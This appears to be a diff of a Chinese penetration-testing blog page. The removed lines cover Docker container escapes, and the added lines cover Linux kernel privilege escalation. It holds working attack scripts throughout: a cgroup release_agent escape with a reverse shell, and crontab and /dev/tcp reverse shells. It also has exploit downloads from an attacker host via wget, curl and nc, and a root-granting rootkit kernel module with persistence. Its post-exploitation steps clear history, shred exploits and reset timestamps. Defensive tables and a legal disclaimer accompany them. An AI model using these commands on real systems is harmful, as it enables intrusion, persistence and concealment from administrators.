-<h2 id="四、Docker-容器逃逸"><a href="#四、Docker-容器逃逸" class="headerlink" title="四、Docker 容器逃逸"></a>四、Docker 容器逃逸</h2><h3 id="4-1-–privileged-模式逃逸"><a href="#4-1-–privileged-模式逃逸" class="headerlink" title="4.1 –privileged 模式逃逸"></a>4.1 –privileged 模式逃逸</h3><p><code>--privileged</code> 赋予容器几乎所有 Capabilities 并解除设备 cgroup 限制：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测是否为 privileged 模式</span></span><br><span class="line"><span class="built_in">cat</span> /proc/self/status | grep CapEff</span><br><span class="line">fdisk -l 2&gt;/dev/null    <span class="comment"># 能看到宿主机磁盘即为 privileged</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逃逸步骤</span></span><br><span class="line">fdisk -l                          <span class="comment"># 确认宿主机磁盘 /dev/sda1</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /mnt/host</span><br><span class="line">mount /dev/sda1 /mnt/host</span><br><span class="line"><span class="built_in">chroot</span> /mnt/host /bin/bash</span><br><span class="line"><span class="comment"># 写 crontab 反弹 shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/5555 0&gt;&amp;1&quot;&#x27;</span> \</span><br><span class="line">    &gt;&gt; /mnt/host/etc/crontab</span><br><span class="line"><span class="comment"># 或添加 SSH 公钥</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAA...&quot;</span> &gt;&gt; /mnt/host/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+<p><strong>问题2：glibc版本不匹配</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -static exploit.c -o exploit_static      <span class="comment"># 静态链接避免glibc依赖</span></span><br><span class="line">musl-gcc -static exploit.c -o exploit_static <span class="comment"># musl更彻底的静态链接</span></span><br><span class="line">ldd exploit_static                           <span class="comment"># 验证: &quot;not a dynamic executable&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="4-2-docker-sock-挂载逃逸"><a href="#4-2-docker-sock-挂载逃逸" class="headerlink" title="4.2 docker.sock 挂载逃逸"></a>4.2 docker.sock 挂载逃逸</h3><p>宿主机 <code>/var/run/docker.sock</code> 被挂载进容器后，容器可操控宿主机 Docker 守护进程：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测</span></span><br><span class="line"><span class="built_in">ls</span> -la /var/run/docker.sock</span><br><span class="line">curl --unix-socket /var/run/docker.sock http://localhost/version</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法一：启动新容器挂载宿主机根文件系统</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it -v /:/host alpine <span class="built_in">chroot</span> /host /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法二：以 privileged + host PID 启动新容器</span></span><br><span class="line">docker -H unix:///var/run/docker.sock run -it --privileged --pid=host \</span><br><span class="line">    alpine nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法三：通过 Docker API 创建容器</span></span><br><span class="line"><span class="built_in">cat</span> &gt; container.json &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;&quot;Image&quot;:&quot;alpine&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;chroot /mnt/host /bin/sh&quot;],</span></span><br><span class="line"><span class="string"> &quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/mnt/host&quot;]&#125;,&quot;SecurityOpt&quot;:[&quot;apparmor=unconfined&quot;]&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">curl -X POST --unix-socket /var/run/docker.sock \</span><br><span class="line">    -H <span class="string">&quot;Content-Type: application/json&quot;</span> -d @container.json \</span><br><span class="line">    http://localhost/containers/create</span><br><span class="line"><span class="comment"># 替换 CONTAINER_ID 后启动</span></span><br><span class="line">curl -X POST --unix-socket /var/run/docker.sock \</span><br><span class="line">    http://localhost/containers/CONTAINER_ID/start</span><br></pre></td></tr></table></figure>
+<p><strong>问题3：架构不匹配（32位&#x2F;64位&#x2F;ARM）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m                                      <span class="comment"># 确认目标架构</span></span><br><span class="line">gcc -m32 exploit.c -o exploit_32             <span class="comment"># 64位机编译32位</span></span><br><span class="line">aarch64-linux-gnu-gcc -static exploit.c -o exploit_arm64</span><br><span class="line">docker run --<span class="built_in">rm</span> -v $(<span class="built_in">pwd</span>):/wrk ubuntu:16.04 \</span><br><span class="line">    bash -c <span class="string">&quot;cd /wrk &amp;&amp; gcc -static exploit.c -o exploit&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="4-3-cgroup-release-agent-逃逸"><a href="#4-3-cgroup-release-agent-逃逸" class="headerlink" title="4.3 cgroup release_agent 逃逸"></a>4.3 cgroup release_agent 逃逸</h3><p>最经典的容器逃逸方式之一，利用 cgroup v1 <code>release_agent</code> 机制在宿主机以 root 执行命令。前置条件：容器拥有 CAP_SYS_ADMIN 且 cgroup 可写。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># === 完整逃逸脚本 ===</span></span><br><span class="line">PAYLOAD=<span class="string">&#x27;#!/bin/sh</span></span><br><span class="line"><span class="string">bash -i &gt;&amp; /dev/tcp/10.0.0.1/7777 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载 cgroup</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp &amp;&amp; mount -t cgroup -o memory cgroup /tmp/cgrp</span><br><span class="line"><span class="built_in">mkdir</span> -p /tmp/cgrp/x</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /tmp/cgrp/x/notify_on_release</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 OverlayFS upperdir（容器文件系统在宿主机的实际路径）</span></span><br><span class="line">host_path=$(sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] Host path: <span class="variable">$host_path</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 payload</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$PAYLOAD</span>&quot;</span> &gt; /tmp/payload.sh</span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/payload.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/tmp/payload.sh&quot;</span> &gt; /tmp/cgrp/release_agent</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发：进程退出 → cgroup 释放 → release_agent 以宿主机 root 执行</span></span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Payload triggered.&quot;</span></span><br></pre></td></tr></table></figure>
+<h3 id="从远程传输Exploit到目标"><a href="#从远程传输Exploit到目标" class="headerlink" title="从远程传输Exploit到目标"></a>从远程传输Exploit到目标</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://attacker-ip/exploit -O /tmp/exploit</span><br><span class="line">curl http://attacker-ip/exploit -o /tmp/exploit</span><br><span class="line">python3 -c <span class="string">&quot;import urllib.request; urllib.request.urlretrieve(&#x27;http://attacker-ip/exploit&#x27;, &#x27;/tmp/exploit&#x27;)&quot;</span></span><br><span class="line">nc attacker-ip 4444 &lt; /tmp/exploit_if_needed  <span class="comment"># netcat传输</span></span><br><span class="line"><span class="built_in">chmod</span> +x /tmp/exploit &amp;&amp; /tmp/exploit</span><br></pre></td></tr></table></figure>
 
-<p>攻击流程图：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">容器内 ① mount cgroup → ② notify_on_release=1</span><br><span class="line">       → ③ 获取 upperdir 路径（宿主机视角）</span><br><span class="line">       → ④ 写 /tmp/payload.sh</span><br><span class="line">       → ⑤ release_agent=&lt;host_path&gt;/tmp/payload.sh</span><br><span class="line">       → ⑥ 进程退出 → 宿主机 root 执行 payload → 反弹 shell</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="八、内核模块（LKM）攻击"><a href="#八、内核模块（LKM）攻击" class="headerlink" title="八、内核模块（LKM）攻击"></a>八、内核模块（LKM）攻击</h2><p>如果攻击者能加载恶意内核模块，便可获得ring0级别控制权，超越root权限。</p>
+<h3 id="恶意LKM示例"><a href="#恶意LKM示例" class="headerlink" title="恶意LKM示例"></a>恶意LKM示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rootkit.c — 加载即提权到root</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">rootkit_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> prepare_creds();</span><br><span class="line">    <span class="keyword">if</span> (!new) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    new-&gt;uid.val = new-&gt;euid.val = <span class="number">0</span>;</span><br><span class="line">    new-&gt;gid.val = new-&gt;egid.val = <span class="number">0</span>;</span><br><span class="line">    new-&gt;suid.val = new-&gt;sgid.val = <span class="number">0</span>;</span><br><span class="line">    new-&gt;fsuid.val = new-&gt;fsgid.val = <span class="number">0</span>;</span><br><span class="line">    commit_creds(new);</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[+] Credentials set to root\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">rootkit_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure>
 
-<h3 id="4-4-proc-文件系统挂载逃逸"><a href="#4-4-proc-文件系统挂载逃逸" class="headerlink" title="4.4 &#x2F;proc 文件系统挂载逃逸"></a>4.4 &#x2F;proc 文件系统挂载逃逸</h3><p>当容器以 <code>--pid=host</code> 或挂载宿主机 <code>/proc</code> 时：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手法一：nsenter 加入宿主机全部命名空间（需要 --pid=host）</span></span><br><span class="line">nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法二：通过 /proc/1/root 访问宿主机根文件系统</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/root/etc/shadow</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAA...&quot;</span> &gt; /proc/1/root/root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手法三：修改宿主机内核参数</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward    <span class="comment"># 开启 IP 转发实现 MitM</span></span><br></pre></td></tr></table></figure>
+<p>Makefile：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line">KDIR := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
 
-<h2 id="五、检测与防御"><a href="#五、检测与防御" class="headerlink" title="五、检测与防御"></a>五、检测与防御</h2><h3 id="检测命令"><a href="#检测命令" class="headerlink" title="检测命令"></a>检测命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">capsh --<span class="built_in">print</span>                        <span class="comment"># 查看当前 Capabilities</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/status | grep Cap        <span class="comment"># 检查权限位</span></span><br><span class="line">mount | grep -E <span class="string">&#x27;docker.sock|/proc|/dev/sd&#x27;</span>  <span class="comment"># 敏感挂载</span></span><br><span class="line"><span class="built_in">cat</span> /proc/1/status | grep Seccomp    <span class="comment"># 0=disabled, 2=filter</span></span><br><span class="line">aa-status 2&gt;/dev/null                <span class="comment"># AppArmor 状态</span></span><br></pre></td></tr></table></figure>
+<h3 id="加载与持久化"><a href="#加载与持久化" class="headerlink" title="加载与持久化"></a>加载与持久化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; insmod rootkit.ko                           <span class="comment"># 加载（需CAP_SYS_MODULE）</span></span><br><span class="line">lsmod | grep rootkit &amp;&amp; rmmod rootkit               <span class="comment"># 查看/卸载</span></span><br><span class="line"><span class="built_in">cp</span> rootkit.ko /lib/modules/$(<span class="built_in">uname</span> -r)/kernel/drivers/misc/  <span class="comment"># 持久化</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;rootkit&quot;</span> &gt;&gt; /etc/modules-load.d/system.conf &amp;&amp; depmod -a</span><br></pre></td></tr></table></figure>
 
-<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><table>
-<thead>
-<tr>
-<th>层面</th>
-<th>措施</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Capabilities</td>
-<td>遵循最小权限，避免 <code>--cap-add=ALL</code></td>
-</tr>
-<tr>
-<td>Privileged</td>
-<td>禁止 <code>--privileged</code>，按需添加具体能力</td>
-</tr>
-<tr>
-<td>docker.sock</td>
-<td>严禁将 Docker socket 挂载到容器</td>
-</tr>
-<tr>
-<td>只读根文件系统</td>
-<td><code>--read-only</code> 阻止写入恶意脚本</td>
-</tr>
-<tr>
-<td>AppArmor &#x2F; SELinux</td>
-<td>启用强制访问控制</td>
-</tr>
-<tr>
-<td>seccomp</td>
-<td>自定义 profile，阻断危险系统调用</td>
-</tr>
-<tr>
-<td>User Namespace</td>
-<td><code>--userns-remap</code> 将容器 root 映射到宿主机非特权用户</td>
-</tr>
-<tr>
-<td>no-new-privileges</td>
-<td><code>--security-opt=no-new-privileges</code> 阻止子进程获取新能力</td>
-</tr>
-</tbody></table>
-<h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>Linux Capabilities 虽将 root 拆分，<code>cap_sys_admin</code>、<code>cap_sys_ptrace</code> 等依然具备近乎 root 的危险性。文件 Capabilities 的错误配置是本地提权的常见入口。在容器场景中，逃逸往往由三个要素促成：<strong>过多的 Capabilities + 共享的宿主机资源 + 缺乏强制访问控制</strong>。理解这些攻击手法是构建纵深防御的前提。</p>
-<p>更多技术参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>、<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/">HackTricks</a>。</p>
-<p><em>本文更新于 2024 年 10 月，部分利用手法可能随内核版本和容器运行时更新而失效。</em></p>
+<h3 id="LKM使用场景与防御"><a href="#LKM使用场景与防御" class="headerlink" title="LKM使用场景与防御"></a>LKM使用场景与防御</h3><p><strong>适用场景</strong>：绕过EDR&#x2F;HIDS（ring3检测不到ring0操作）；隐藏进程&#x2F;文件&#x2F;网络连接；绕过SELinux&#x2F;AppArmor。</p>
+<p><strong>防御手段</strong>：<code>CONFIG_MODULE_SIG_FORCE</code>强制签名；Secure Boot；<code>echo 1 &gt; /proc/sys/kernel/lockdown</code>内核锁定；审计<code>insmod</code>&#x2F;<code>modprobe</code>系统调用。</p>
+<hr>
+<h2 id="九、内核安全防护绕过"><a href="#九、内核安全防护绕过" class="headerlink" title="九、内核安全防护绕过"></a>九、内核安全防护绕过</h2><h3 id="KPTI-SMEP-SMAP"><a href="#KPTI-SMEP-SMAP" class="headerlink" title="KPTI &#x2F; SMEP &#x2F; SMAP"></a>KPTI &#x2F; SMEP &#x2F; SMAP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">KPTI (页表隔离): 分离内核与用户态页表</span><br><span class="line">  → 绕过: 使用不依赖内核地址的exploit (如DirtyPipe/PwnKit)</span><br><span class="line"></span><br><span class="line">SMEP (禁止执行用户态代码): 内核态不能执行userspace代码</span><br><span class="line">  → 绕过: 全内核ROP/JOP链，或数据攻击原语</span><br><span class="line"></span><br><span class="line">SMAP (禁止访问用户态内存): 内核不能直接读写userspace</span><br><span class="line">  → 绕过: 使用copy_from_user/copy_to_user内核API</span><br></pre></td></tr></table></figure>
+
+<h3 id="SELinux-AppArmor-只读文件系统"><a href="#SELinux-AppArmor-只读文件系统" class="headerlink" title="SELinux &#x2F; AppArmor &#x2F; 只读文件系统"></a>SELinux &#x2F; AppArmor &#x2F; 只读文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getenforce &amp;&amp; aa-status     <span class="comment"># SELinux/AppArmor状态</span></span><br><span class="line">mount | grep <span class="string">&quot;ro,&quot;</span> &amp;&amp; mount -o remount,rw / 2&gt;/dev/null   <span class="comment"># 只读文件系统</span></span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null | <span class="built_in">head</span>               <span class="comment"># 寻找可写分区</span></span><br></pre></td></tr></table></figure>
+
+<p>SELinux Enforcing下DirtyCow写 <code>/etc/passwd</code> 会被阻止，但 <code>/etc/shadow</code> 通常不阻止；PwnKit受影响较小。</p>
+<h3 id="grsecurity-PaX"><a href="#grsecurity-PaX" class="headerlink" title="grsecurity &#x2F; PaX"></a>grsecurity &#x2F; PaX</h3><p>商业加固内核修补了大多数公开exploit。对策：转向非内核路径（SUID、sudo、cron、服务漏洞），或利用未受保护的设备文件与配置错误。</p>
+<hr>
+<h2 id="十、提权后操作"><a href="#十、提权后操作" class="headerlink" title="十、提权后操作"></a>十、提权后操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HISTFILE=/dev/null &amp;&amp; <span class="built_in">history</span> -c &amp;&amp; <span class="built_in">unset</span> HISTFILE  <span class="comment"># 清理命令历史</span></span><br><span class="line"><span class="built_in">shred</span> -zu /tmp/exploit /tmp/dirty*                          <span class="comment"># 删除exploit</span></span><br><span class="line"><span class="built_in">touch</span> -r /etc/issue /etc/passwd                             <span class="comment"># 重置文件时间戳</span></span><br><span class="line"><span class="built_in">mkdir</span> -p /root/.ssh &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;ssh-rsa AAAA...&quot;</span> &gt;&gt; /root/.ssh/authorized_keys  <span class="comment"># SSH持久化</span></span><br><span class="line">(crontab -l 2&gt;/dev/null; <span class="built_in">echo</span> <span class="string">&quot;*/5 * * * * bash -c &#x27;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&#x27;&quot;</span>) | crontab -</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>从2012年的Mempodipper到2022年的DirtyPipe，Linux内核攻击面从未消失。渗透测试人员的核心能力：</p>
+<ol>
+<li><strong>建立CVE-Exploit映射库</strong>，覆盖常见内核版本</li>
+<li><strong>掌握交叉编译</strong>，应对无编译环境的目标</li>
+<li><strong>理解每种exploit原语与限制</strong>，而非盲目运行</li>
+<li><strong>持续跟踪新CVE</strong>，内核提权领域迭代极快</li>
+</ol>
+<hr>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文仅供授权安全研究和渗透测试使用。读者须确保所有测试均在合法授权范围内进行。未经授权对计算机系统进行攻击可能触犯《刑法》第285条（非法侵入计算机信息系统罪）等相关法律，作者不对任何滥用行为承担法律责任。</p>
+<hr>
+<p><strong>参考文献</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://dirtycow.ninja/">DirtyCow CVE-2016-5195</a></li>
+<li><a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">DirtyPipe CVE-2022-0847 by Max Kellermann</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt">PwnKit CVE-2021-4034 by Qualys</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.linuxkernelcves.com/">Linux Kernel CVEs</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">Exploit Database</a></li>
+</ul>
 
       
     </div>
